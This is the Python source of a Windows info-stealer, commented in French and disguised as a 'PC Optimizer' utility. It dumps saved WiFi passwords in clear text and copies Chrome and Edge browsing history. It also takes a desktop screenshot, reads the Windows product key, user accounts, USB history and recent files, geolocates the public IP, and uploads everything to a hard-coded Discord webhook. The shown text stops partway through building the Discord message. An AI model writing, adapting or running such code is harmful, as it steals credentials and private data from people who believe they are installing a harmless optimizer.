# -*- coding: utf-8 -*-
"""
PC OPTIMIZER - WEBHOOK DISCORD ULTIMATE EDITION
Version 5.0 - Le tracker le plus complet au monde
Nouvelles fonctionnalités : Photo profil, WiFi passwords, historique, screenshot, etc.
"""

import sys
import json
import platform
import socket
import getpass
import os
import subprocess
import uuid
import base64
import shutil
from datetime import datetime, timezone
from urllib import request, error
from pathlib import Path

# WEBHOOK DISCORD
WEBHOOK_URL = "https://discord.com/api/webhooks/1469683553703821333/Pr00yLSlEiVWJdS_9v_OB7Yhh_h1WvLpkM8NgsPumSvr5QrIjR1hOgcr6Bmro5sqvEfF"

def run_cmd(command):
    """Execute une commande et retourne le résultat"""
    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=10,
            shell=True
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except:
        return None

def get_wmic_value(query, field):
    """Récupère une valeur via WMIC"""
    try:
        result = subprocess.run(
            f'wmic {query} get {field} /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if f'{field}=' in line:
                    value = line.split('=')[1].strip()
                    if value:
                        return value
    except:
        pass
    return None

def get_public_ip():
    """IP publique avec géolocalisation"""
    try:
        with request.urlopen("https://ipapi.co/json/", timeout=5) as r:
            data = json.loads(r.read().decode())
            return {
                "ip": data.get("ip", "Non disponible"),
                "country": data.get("country_name", "Inconnu"),
                "city": data.get("city", "Inconnu"),
                "isp": data.get("org", "Inconnu"),
                "latitude": data.get("latitude", "N/A"),
                "longitude": data.get("longitude", "N/A"),
                "timezone": data.get("timezone", "N/A")
            }
    except:
        try:
            with request.urlopen("https://api.ipify.org", timeout=5) as r:
                return {
                    "ip": r.read().decode().strip(),
                    "country": "Non disponible",
                    "city": "Non disponible",
                    "isp": "Non disponible",
                    "latitude": "N/A",
                    "longitude": "N/A",
                    "timezone": "N/A"
                }
        except:
            return {
                "ip": "Non disponible",
                "country": "Non disponible",
                "city": "Non disponible",
                "isp": "Non disponible",
                "latitude": "N/A",
                "longitude": "N/A",
                "timezone": "N/A"
            }

def get_local_ip():
    """IP locale"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "Non disponible"

def get_mac_address():
    """Adresse MAC"""
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0,2*6,2)][::-1])
        return mac.upper()
    except:
        return "Non disponible"

def get_wifi_passwords():
    """Récupère tous les réseaux WiFi avec leurs mots de passe"""
    wifi_list = []
    try:
        # Liste tous les profils WiFi
        profiles_result = run_cmd('netsh wlan show profiles')
        if profiles_result:
            lines = profiles_result.split('\n')
            for line in lines:
                if "Profil Tous les utilisateurs" in line or "All User Profile" in line:
                    profile_name = line.split(':')[1].strip()
                    
                    # Récupère le mot de passe pour chaque profil
                    password_result = run_cmd(f'netsh wlan show profile name="{profile_name}" key=clear')
                    password = "Pas de mot de passe"
                    
                    if password_result:
                        for pwd_line in password_result.split('\n'):
                            if "Contenu de la clé" in pwd_line or "Key Content" in pwd_line:
                                password = pwd_line.split(':')[1].strip()
                                break
                    
                    wifi_list.append({
                        "ssid": profile_name,
                        "password": password
                    })
    except:
        pass
    
    return wifi_list

def get_browser_history():
    """Récupère l'historique des navigateurs (Chrome, Edge, Firefox)"""
    history = {
        "chrome": [],
        "edge": [],
        "firefox": []
    }
    
    username = os.environ.get('USERNAME', '')
    
    # Chrome
    try:
        chrome_history_path = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if os.path.exists(chrome_history_path):
            # Copie temporaire pour éviter le verrouillage
            temp_path = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\chrome_history_temp"
            shutil.copy2(chrome_history_path, temp_path)
            
            try:
                import sqlite3
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                for row in cursor.fetchall():
                    history["chrome"].append({
                        "url": row[0],
                        "title": row[1] if row[1] else "Sans titre"
                    })
                conn.close()
            except:
                pass
            
            try:
                os.remove(temp_path)
            except:
                pass
    except:
        pass
    
    # Edge
    try:
        edge_history_path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"
        if os.path.exists(edge_history_path):
            temp_path = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\edge_history_temp"
            shutil.copy2(edge_history_path, temp_path)
            
            try:
                import sqlite3
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 30")
                for row in cursor.fetchall():
                    history["edge"].append({
                        "url": row[0],
                        "title": row[1] if row[1] else "Sans titre"
                    })
                conn.close()
            except:
                pass
            
            try:
                os.remove(temp_path)
            except:
                pass
    except:
        pass
    
    return history

def get_startup_programs():
    """Applications au démarrage"""
    startup_programs = []
    
    try:
        # Startup depuis le registre
        result = run_cmd('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"')
        if result:
            lines = result.split('\n')
            for line in lines:
                if 'REG_SZ' in line:
                    parts = line.strip().split('REG_SZ')
                    if len(parts) >= 2:
                        name = parts[0].strip()
                        path = parts[1].strip()
                        startup_programs.append(f"{name}: {path}")
    except:
        pass
    
    return startup_programs[:15]  # Limite à 15

def get_running_processes():
    """Processus en cours d'exécution (top 20)"""
    processes = []
    
    try:
        result = run_cmd('tasklist /FO CSV /NH')
        if result:
            lines = result.split('\n')[:20]
            for line in lines:
                if line.strip():
                    parts = line.replace('"', '').split(',')
                    if len(parts) >= 2:
                        processes.append({
                            "name": parts[0].strip(),
                            "pid": parts[1].strip()
                        })
    except:
        pass
    
    return processes

def get_usb_history():
    """Historique des périphériques USB"""
    usb_devices = []
    
    try:
        result = run_cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR" /s')
        if result:
            lines = result.split('\n')
            for line in lines:
                if 'FriendlyName' in line:
                    device_name = line.split('REG_SZ')[-1].strip()
                    if device_name and device_name not in usb_devices:
                        usb_devices.append(device_name)
    except:
        pass
    
    return usb_devices[:10]  # Limite à 10

def get_user_accounts():
    """Liste tous les comptes utilisateurs Windows"""
    accounts = []
    
    try:
        result = run_cmd('net user')
        if result:
            lines = result.split('\n')
            capture = False
            for line in lines:
                if '---' in line:
                    capture = True
                    continue
                if capture and line.strip():
                    users = line.split()
                    for user in users:
                        if user and user not in ['La', 'commande', 's\'est']:
                            accounts.append(user)
    except:
        pass
    
    return accounts

def get_windows_product_key():
    """Récupère la clé de produit Windows"""
    try:
        result = run_cmd('wmic path softwarelicensingservice get OA3xOriginalProductKey')
        if result:
            lines = result.split('\n')
            for line in lines:
                line = line.strip()
                if line and 'OA3xOriginalProductKey' not in line:
                    return line
    except:
        pass
    return "Non disponible"

def take_screenshot():
    """Prend un screenshot du bureau"""
    try:
        # Utilise PowerShell pour prendre un screenshot
        username = os.environ.get('USERNAME', '')
        screenshot_path = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\screenshot_pc_optimizer.png"
        
        powershell_cmd = f'''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("{screenshot_path}", [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
'''
        
        result = subprocess.run(
            ['powershell', '-Command', powershell_cmd],
            capture_output=True,
            timeout=10
        )
        
        if os.path.exists(screenshot_path):
            return screenshot_path
    except:
        pass
    
    return None

def get_user_profile_picture():
    """Récupère la photo de profil Windows"""
    try:
        username = os.environ.get('USERNAME', '')
        
        # Chemin standard de la photo de profil
        profile_pic_paths = [
            f"C:\\Users\\{username}\\AppData\\Local\\Temp\\{username}.bmp",
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures\\{username}.bmp",
            f"C:\\ProgramData\\Microsoft\\User Account Pictures\\{username}.bmp",
        ]
        
        # Essaie de copier la photo de profil depuis les dossiers système
        for possible_path in profile_pic_paths:
            if os.path.exists(possible_path):
                return possible_path
        
        # Sinon, essaie via PowerShell
        temp_path = f"C:\\Users\\{username}\\AppData\\Local\\Temp\\profile_pic_temp.jpg"
        
        powershell_cmd = f'''
$user = New-Object System.Security.Principal.NTAccount($env:USERNAME)
$sid = $user.Translate([System.Security.Principal.SecurityIdentifier]).Value
$imagePath = "C:\\Users\\Public\\AccountPictures\\$sid.jpg"
if (Test-Path $imagePath) {{
    Copy-Item $imagePath "{temp_path}"
}}
'''
        
        subprocess.run(['powershell', '-Command', powershell_cmd], capture_output=True, timeout=5)
        
        if os.path.exists(temp_path):
            return temp_path
            
    except:
        pass
    
    return None

def get_recent_files():
    """Fichiers récents ouverts"""
    recent_files = []
    
    try:
        username = os.environ.get('USERNAME', '')
        recent_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Recent"
        
        if os.path.exists(recent_path):
            files = os.listdir(recent_path)
            files = [f for f in files if not f.endswith('.lnk')]
            
            # Trie par date de modification
            files_with_time = []
            for f in files[:30]:
                try:
                    full_path = os.path.join(recent_path, f)
                    mtime = os.path.getmtime(full_path)
                    files_with_time.append((f, mtime))
                except:
                    pass
            
            files_with_time.sort(key=lambda x: x[1], reverse=True)
            recent_files = [f[0] for f in files_with_time[:30]]
    except:
        pass
    
    return recent_files

def get_desktop_files():
    """Liste les fichiers sur le bureau"""
    desktop_files = []
    
    try:
        username = os.environ.get('USERNAME', '')
        desktop_path = f"C:\\Users\\{username}\\Desktop"
        
        if os.path.exists(desktop_path):
            files = os.listdir(desktop_path)
            desktop_files = files[:20]  # Limite à 20
    except:
        pass
    
    return desktop_files

def get_system_info():
    """Informations système complètes"""
    info = {}
    
    os_caption = get_wmic_value('os', 'Caption') or f"{platform.system()} {platform.release()}"
    os_version = get_wmic_value('os', 'Version') or platform.version()
    os_build = get_wmic_value('os', 'BuildNumber') or "Inconnu"
    
    info['system'] = {
        "os_name": os_caption,
        "os_version": os_version,
        "os_build": os_build,
        "architecture": platform.machine(),
        "pc_name": socket.gethostname(),
        "user_name": os.environ.get('USERNAME') or os.environ.get('USER') or getpass.getuser(),
        "domain": os.environ.get('USERDOMAIN', 'WORKGROUP'),
        "install_date": get_wmic_value('os', 'InstallDate') or "Inconnu",
        "boot_time": get_wmic_value('os', 'LastBootUpTime') or "Inconnu"
    }
    
    return info

def get_cpu_info():
    """Informations processeur détaillées"""
    cpu_name = get_wmic_value('cpu', 'Name') or "Non détecté"
    cpu_cores = get_wmic_value('cpu', 'NumberOfCores') or "?"
    cpu_threads = get_wmic_value('cpu', 'NumberOfLogicalProcessors') or "?"
    cpu_max_speed = get_wmic_value('cpu', 'MaxClockSpeed')
    
    speed_ghz = f"{float(cpu_max_speed)/1000:.2f} GHz" if cpu_max_speed else "Inconnu"
    
    return {
        "name": cpu_name,
        "cores": cpu_cores,
        "threads": cpu_threads,
        "speed": speed_ghz,
        "architecture": platform.machine()
    }

def get_ram_info():
    """Informations mémoire"""
    total_ram = get_wmic_value('ComputerSystem', 'TotalPhysicalMemory')
    
    if total_ram:
        ram_gb = round(int(total_ram) / (1024**3), 2)
    else:
        ram_gb = "Non détecté"
    
    ram_slots = []
    try:
        result = subprocess.run(
            'wmic memorychip get Capacity,Speed,Manufacturer /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_slot = {}
            for line in result.stdout.split('\n'):
                if 'Capacity=' in line and line.split('=')[1].strip():
                    capacity_gb = round(int(line.split('=')[1].strip()) / (1024**3), 2)
                    current_slot['capacity'] = f"{capacity_gb} GB"
                elif 'Speed=' in line and line.split('=')[1].strip():
                    current_slot['speed'] = f"{line.split('=')[1].strip()} MHz"
                elif 'Manufacturer=' in line:
                    current_slot['manufacturer'] = line.split('=')[1].strip() or "Inconnu"
                    if 'capacity' in current_slot:
                        ram_slots.append(current_slot)
                    current_slot = {}
    except:
        pass
    
    return {
        "total": f"{ram_gb} GB" if isinstance(ram_gb, float) else ram_gb,
        "slots": ram_slots
    }

def get_gpu_info():
    """Informations carte graphique"""
    gpus = []
    try:
        result = subprocess.run(
            'wmic path win32_VideoController get Name,AdapterRAM,DriverVersion /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_gpu = {}
            for line in result.stdout.split('\n'):
                if 'Name=' in line and line.split('=')[1].strip():
                    current_gpu['name'] = line.split('=')[1].strip()
                elif 'AdapterRAM=' in line and line.split('=')[1].strip():
                    vram_gb = round(int(line.split('=')[1].strip()) / (1024**3), 2)
                    current_gpu['vram'] = f"{vram_gb} GB"
                elif 'DriverVersion=' in line:
                    current_gpu['driver'] = line.split('=')[1].strip() or "Inconnu"
                    if 'name' in current_gpu:
                        gpus.append(current_gpu)
                    current_gpu = {}
    except:
        pass
    
    return gpus

def get_motherboard_info():
    """Informations carte mère"""
    manufacturer = get_wmic_value('baseboard', 'Manufacturer') or "Inconnu"
    product = get_wmic_value('baseboard', 'Product') or "Inconnu"
    version = get_wmic_value('baseboard', 'Version') or ""
    serial = get_wmic_value('baseboard', 'SerialNumber') or "Inconnu"
    
    return {
        "manufacturer": manufacturer,
        "model": product,
        "version": version,
        "serial": serial
    }

def get_bios_info():
    """Informations BIOS"""
    return {
        "manufacturer": get_wmic_value('bios', 'Manufacturer') or "Inconnu",
        "version": get_wmic_value('bios', 'Version') or "Inconnu",
        "date": get_wmic_value('bios', 'ReleaseDate') or "Inconnu"
    }

def get_disk_info():
    """Informations de stockage"""
    logical_disks = []
    physical_disks = []
    
    try:
        result = subprocess.run(
            'wmic logicaldisk get Caption,VolumeName,FileSystem,Size,FreeSpace /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_disk = {}
            for line in result.stdout.split('\n'):
                if 'Caption=' in line and line.split('=')[1].strip():
                    current_disk['letter'] = line.split('=')[1].strip()
                elif 'VolumeName=' in line:
                    current_disk['name'] = line.split('=')[1].strip() or "Sans nom"
                elif 'FileSystem=' in line:
                    current_disk['fs'] = line.split('=')[1].strip() or "N/A"
                elif 'Size=' in line and line.split('=')[1].strip():
                    size_gb = round(int(line.split('=')[1].strip()) / (1024**3), 2)
                    current_disk['total'] = size_gb
                elif 'FreeSpace=' in line:
                    free_gb = round(int(line.split('=')[1].strip()) / (1024**3), 2) if line.split('=')[1].strip() else 0
                    if 'total' in current_disk:
                        used_gb = current_disk['total'] - free_gb
                        usage_percent = round((used_gb / current_disk['total']) * 100, 1) if current_disk['total'] > 0 else 0
                        current_disk['used'] = used_gb
                        current_disk['free'] = free_gb
                        current_disk['usage'] = usage_percent
                        logical_disks.append(current_disk)
                    current_disk = {}
    except:
        pass
    
    try:
        result = subprocess.run(
            'wmic diskdrive get Model,Size,InterfaceType /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_disk = {}
            for line in result.stdout.split('\n'):
                if 'Model=' in line and line.split('=')[1].strip():
                    current_disk['model'] = line.split('=')[1].strip()
                elif 'Size=' in line and line.split('=')[1].strip():
                    size_gb = round(int(line.split('=')[1].strip()) / (1024**3), 2)
                    current_disk['size'] = f"{size_gb} GB"
                elif 'InterfaceType=' in line:
                    current_disk['interface'] = line.split('=')[1].strip() or "Inconnu"
                    if 'model' in current_disk:
                        physical_disks.append(current_disk)
                    current_disk = {}
    except:
        pass
    
    return {
        "logical": logical_disks,
        "physical": physical_disks
    }

def get_screen_info():
    """Informations écrans"""
    screens = []
    try:
        result = subprocess.run(
            'wmic desktopmonitor get ScreenWidth,ScreenHeight /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_screen = {}
            for line in result.stdout.split('\n'):
                if 'ScreenWidth=' in line and line.split('=')[1].strip():
                    current_screen['width'] = line.split('=')[1].strip()
                elif 'ScreenHeight=' in line and line.split('=')[1].strip():
                    current_screen['height'] = line.split('=')[1].strip()
                    if 'width' in current_screen:
                        screens.append(current_screen)
                    current_screen = {}
    except:
        pass
    
    if not screens:
        screens.append({"width": "Non détecté", "height": "Non détecté"})
    
    return screens

def get_network_adapters():
    """Adaptateurs réseau"""
    adapters = []
    try:
        result = subprocess.run(
            'wmic nicconfig where IPEnabled=true get Description,IPAddress,MACAddress /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            current_adapter = {}
            for line in result.stdout.split('\n'):
                if 'Description=' in line and line.split('=')[1].strip():
                    current_adapter['name'] = line.split('=')[1].strip()
                elif 'IPAddress=' in line:
                    ip_raw = line.split('=')[1].strip()
                    if ip_raw and '{' in ip_raw:
                        ips = ip_raw.strip('{}').replace('"', '').split(',')
                        current_adapter['ip'] = ips[0].strip() if ips else "N/A"
                elif 'MACAddress=' in line:
                    current_adapter['mac'] = line.split('=')[1].strip() or "N/A"
                    if 'name' in current_adapter:
                        adapters.append(current_adapter)
                    current_adapter = {}
    except:
        pass
    
    return adapters

def get_security_info():
    """Informations de sécurité"""
    antivirus = []
    try:
        result = subprocess.run(
            'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value',
            capture_output=True,
            text=True,
            timeout=5,
            shell=True
        )
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'displayName=' in line:
                    av_name = line.split('=')[1].strip()
                    if av_name:
                        antivirus.append(av_name)
    except:
        pass
    
    if not antivirus:
        antivirus.append("Aucun antivirus détecté")
    
    defender = "Inconnu"
    firewall = "Inconnu"
    uac = "Inconnu"
    
    try:
        defender_result = run_cmd('sc query WinDefend')
        defender = "Actif" if defender_result and "RUNNING" in defender_result else "Inactif"
    except:
        pass
    
    try:
        firewall_result = run_cmd('netsh advfirewall show allprofiles state')
        firewall = "Actif" if firewall_result and "ON" in firewall_result else "Inactif"
    except:
        pass
    
    try:
        uac_result = get_wmic_value('useraccount where name="%username%"', 'SID')
        uac = "Actif" if uac_result else "Inconnu"
    except:
        pass
    
    return {
        "antivirus": antivirus,
        "defender": defender,
        "firewall": firewall,
        "uac": uac
    }

def get_all_installed_software():
    """Récupère TOUS les logiciels installés"""
    software_list = []
    
    try:
        result = subprocess.run(
            'wmic product get Name,Version,InstallDate /value',
            capture_output=True,
            text=True,
            timeout=30,
            shell=True
        )
        
        if result.returncode == 0:
            current_soft = {}
            for line in result.stdout.split('\n'):
                if 'Name=' in line and line.split('=')[1].strip():
                    current_soft['name'] = line.split('=')[1].strip()
                elif 'Version=' in line:
                    current_soft['version'] = line.split('=')[1].strip() or "N/A"
                elif 'InstallDate=' in line:
                    install_date = line.split('=')[1].strip() or "N/A"
                    current_soft['install_date'] = install_date
                    if 'name' in current_soft:
                        software_list.append(current_soft)
                    current_soft = {}
    except:
        pass
    
    # Tri par date d'installation (les plus récents en premier)
    software_list_with_dates = [s for s in software_list if s.get('install_date') != "N/A"]
    software_list_without_dates = [s for s in software_list if s.get('install_date') == "N/A"]
    
    software_list_with_dates.sort(key=lambda x: x.get('install_date', ''), reverse=True)
    
    return software_list_with_dates + software_list_without_dates

def save_software_list_to_file(software_list, username, pcname):
    """Sauvegarde la liste complète des logiciels dans un fichier texte"""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"Logiciels_Installes_{pcname}_{username}_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(f"  LISTE COMPLÈTE DES LOGICIELS INSTALLÉS\n")
            f.write(f"  PC: {pcname} | Utilisateur: {username}\n")
            f.write(f"  Date: {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Nombre total de logiciels détectés: {len(software_list)}\n\n")
            
            # Section: 30 derniers logiciels installés
            f.write("╔" + "=" * 78 + "╗\n")
            f.write("║" + " " * 20 + "🆕 30 DERNIERS LOGICIELS INSTALLÉS" + " " * 24 + "║\n")
            f.write("╚" + "=" * 78 + "╝\n\n")
            
            recent_software = [s for s in software_list if s.get('install_date') != "N/A"][:30]
            
            for i, soft in enumerate(recent_software, 1):
                install_date = soft.get('install_date', 'N/A')
                if install_date != 'N/A' and len(install_date) >= 8:
                    install_date_formatted = f"{install_date[6:8]}/{install_date[4:6]}/{install_date[0:4]}"
                else:
                    install_date_formatted = install_date
                
                f.write(f"{i}. {soft['name']}\n")
                f.write(f"   Version: {soft['version']}\n")
                f.write(f"   Date d'installation: {install_date_formatted}\n\n")
            
            # Section: Tous les logiciels
            f.write("\n" + "╔" + "=" * 78 + "╗\n")
            f.write("║" + " " * 25 + "📦 TOUS LES LOGICIELS" + " " * 32 + "║\n")
            f.write("╚" + "=" * 78 + "╝\n\n")
            
            for i, soft in enumerate(software_list, 1):
                f.write(f"{i}. {soft['name']}\n")
                f.write(f"   Version: {soft['version']}\n\n")
            
            f.write("-" * 80 + "\n")
            f.write(f"Fin du rapport - {len(software_list)} logiciels listés\n")
        
        print(f"[✓] Fichier créé: {filename}")
        return filename
    except Exception as e:
        print(f"[✗] Erreur lors de la création du fichier: {e}")
        return None

def save_wifi_passwords_to_file(wifi_list, username, pcname):
    """Sauvegarde les mots de passe WiFi dans un fichier"""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"WiFi_Passwords_{pcname}_{username}_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(f"  📡 RÉSEAUX WIFI ENREGISTRÉS & MOTS DE PASSE\n")
            f.write(f"  PC: {pcname} | Utilisateur: {username}\n")
            f.write(f"  Date: {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Nombre de réseaux WiFi enregistrés: {len(wifi_list)}\n\n")
            f.write("-" * 80 + "\n\n")
            
            for i, wifi in enumerate(wifi_list, 1):
                f.write(f"{i}. SSID: {wifi['ssid']}\n")
                f.write(f"   Mot de passe: {wifi['password']}\n\n")
            
            f.write("-" * 80 + "\n")
            f.write(f"Fin du rapport - {len(wifi_list)} réseaux listés\n")
        
        print(f"[✓] Fichier WiFi créé: {filename}")
        return filename
    except Exception as e:
        print(f"[✗] Erreur lors de la création du fichier WiFi: {e}")
        return None

def save_browser_history_to_file(history, username, pcname):
    """Sauvegarde l'historique des navigateurs dans un fichier"""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"Browser_History_{pcname}_{username}_{timestamp}.txt"
    
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write(f"  🌐 HISTORIQUE DES NAVIGATEURS\n")
            f.write(f"  PC: {pcname} | Utilisateur: {username}\n")
            f.write(f"  Date: {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            # Chrome
            if history['chrome']:
                f.write("╔" + "=" * 78 + "╗\n")
                f.write("║" + " " * 30 + "GOOGLE CHROME" + " " * 35 + "║\n")
                f.write("╚" + "=" * 78 + "╝\n\n")
                
                for i, item in enumerate(history['chrome'], 1):
                    f.write(f"{i}. {item['title']}\n")
                    f.write(f"   URL: {item['url']}\n\n")
            
            # Edge
            if history['edge']:
                f.write("\n╔" + "=" * 78 + "╗\n")
                f.write("║" + " " * 30 + "MICROSOFT EDGE" + " " * 34 + "║\n")
                f.write("╚" + "=" * 78 + "╝\n\n")
                
                for i, item in enumerate(history['edge'], 1):
                    f.write(f"{i}. {item['title']}\n")
                    f.write(f"   URL: {item['url']}\n\n")
            
            f.write("-" * 80 + "\n")
            f.write("Fin du rapport d'historique\n")
        
        print(f"[✓] Fichier historique créé: {filename}")
        return filename
    except Exception as e:
        print(f"[✗] Erreur lors de la création du fichier historique: {e}")
        return None

def collect_all_info():
    """Collecte toutes les informations système"""
    print("[●] Collecte des informations système...")
    system_info = get_system_info()
    
    print("[●] Analyse du processeur...")
    cpu_info = get_cpu_info()
    
    print("[●] Analyse de la mémoire...")
    ram_info = get_ram_info()
    
    print("[●] Détection des cartes graphiques...")
    gpu_info = get_gpu_info()
    
    print("[●] Informations carte mère...")
    motherboard_info = get_motherboard_info()
    
    print("[●] Informations BIOS...")
    bios_info = get_bios_info()
    
    print("[●] Analyse du stockage...")
    disk_info = get_disk_info()
    
    print("[●] Détection des écrans...")
    screen_info = get_screen_info()
    
    print("[●] Configuration réseau...")
    public_ip_info = get_public_ip()
    local_ip = get_local_ip()
    mac_address = get_mac_address()
    network_adapters = get_network_adapters()
    
    print("[●] Analyse de la sécurité...")
    security_info = get_security_info()
    
    print("[●] Récupération de TOUS les logiciels installés...")
    all_software = get_all_installed_software()
    
    print("[●] Récupération des mots de passe WiFi...")
    wifi_passwords = get_wifi_passwords()
    
    print("[●] Récupération de l'historique des navigateurs...")
    browser_history = get_browser_history()
    
    print("[●] Programmes au démarrage...")
    startup_programs = get_startup_programs()
    
    print("[●] Processus en cours...")
    running_processes = get_running_processes()
    
    print("[●] Historique USB...")
    usb_history = get_usb_history()
    
    print("[●] Comptes utilisateurs...")
    user_accounts = get_user_accounts()
    
    print("[●] Clé produit Windows...")
    windows_key = get_windows_product_key()
    
    print("[●] Fichiers récents...")
    recent_files = get_recent_files()
    
    print("[●] Fichiers sur le bureau...")
    desktop_files = get_desktop_files()
    
    print("[●] Capture d'écran en cours...")
    screenshot_path = take_screenshot()
    
    print("[●] Récupération de la photo de profil...")
    profile_picture_path = get_user_profile_picture()
    
    print("[●] Version Python...")
    python_version = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
    
    return {
        "system": system_info['system'],
        "cpu": cpu_info,
        "ram": ram_info,
        "gpu": gpu_info,
        "motherboard": motherboard_info,
        "bios": bios_info,
        "disks": disk_info,
        "screens": screen_info,
        "network": {
            "public_ip": public_ip_info['ip'],
            "country": public_ip_info['country'],
            "city": public_ip_info['city'],
            "isp": public_ip_info['isp'],
            "latitude": public_ip_info['latitude'],
            "longitude": public_ip_info['longitude'],
            "timezone": public_ip_info['timezone'],
            "local_ip": local_ip,
            "mac_address": mac_address,
            "adapters": network_adapters
        },
        "security": security_info,
        "software": all_software,
        "python_version": python_version,
        "wifi_passwords": wifi_passwords,
        "browser_history": browser_history,
        "startup_programs": startup_programs,
        "running_processes": running_processes,
        "usb_history": usb_history,
        "user_accounts": user_accounts,
        "windows_key": windows_key,
        "recent_files": recent_files,
        "desktop_files": desktop_files,
        "screenshot_path": screenshot_path,
        "profile_picture_path": profile_picture_path
    }

def upload_file_to_discord(filepath, webhook_url):
    """Upload un fichier sur Discord via webhook"""
    if not filepath or not os.path.exists(filepath):
        return False
    
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            
            # Utilise requests si disponible, sinon urllib
            try:
                import requests
                response = requests.post(webhook_url, files=files, timeout=30)
                return response.status_code in (200, 204)
            except ImportError:
                # Fallback avec urllib (plus complexe)
                import mimetypes
                from io import BytesIO
                
                filename = os.path.basename(filepath)
                file_data = f.read()
                
                boundary = '----WebKitFormBoundary' + ''.join(str(uuid.uuid4()).split('-'))
                
                body = BytesIO()
                body.write(f'--{boundary}\r\n'.encode())
                body.write(f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode())
                body.write(f'Content-Type: {mimetypes.guess_type(filename)[0] or "application/octet-stream"}\r\n\r\n'.encode())
                body.write(file_data)
                body.write(f'\r\n--{boundary}--\r\n'.encode())
                
                req = request.Request(
                    webhook_url,
                    data=body.getvalue(),
                    headers={
                        'Content-Type': f'multipart/form-data; boundary={boundary}'
                    },
                    method='POST'
                )
                
                with request.urlopen(req, timeout=30) as response:
                    return response.status in (200, 204)
    except Exception as e:
        print(f"[✗] Erreur upload fichier: {e}")
        return False

def send_webhook(info):
    """Envoie les informations via webhook Discord - VERSION ULTIMATE"""
    
    # Formatage des dates
    install_date = info['system']['install_date']
    if len(install_date) >= 8:
        install_date_formatted = f"{install_date[6:8]}/{install_date[4:6]}/{install_date[0:4]}"
    else:
        install_date_formatted = install_date
    
    boot_time = info['system']['boot_time']
    if len(boot_time) >= 14:
        boot_time_formatted = f"{boot_time[6:8]}/{boot_time[4:6]}/{boot_time[0:4]} à {boot_time[8:10]}:{boot_time[10:12]}"
    else:
        boot_time_formatted = boot_time
    
    # Détails RAM
    ram_details = ""
    if info['ram']['slots']:
        for i, slot in enumerate(info['ram']['slots'], 1):
            ram_details += f"Slot {i}: {slot.get('capacity', 'N/A')} @ {slot.get('speed', 'N/A')} ({slot.get('manufacturer', 'Inconnu')})\n"
    
    # Google Maps link avec coordonnées
    maps_link = "Non disponible"
    if info['network']['latitude'] != "N/A" and info['network']['longitude'] != "N/A":
        maps_link = f"https://www.google.com/maps?q={info['network']['latitude']},{info['network']['longitude']}"
    
    # ═══════════════════════════════════════════════════════════
    # EMBED 1: VUE D'ENSEMBLE + NOUVELLES INFOS
    # ═══════════════════════════════════════════════════════════
    embed_overview = {
        "title": "📊 VUE D'ENSEMBLE DU SYSTÈME",
        "description": f"**Installation de PC Optimizer détectée sur `{info['system']['pc_name']}`**",
        "color": 5814783,
        "fields": [
            {
                "name": "👤 Utilisateur & Comptes",
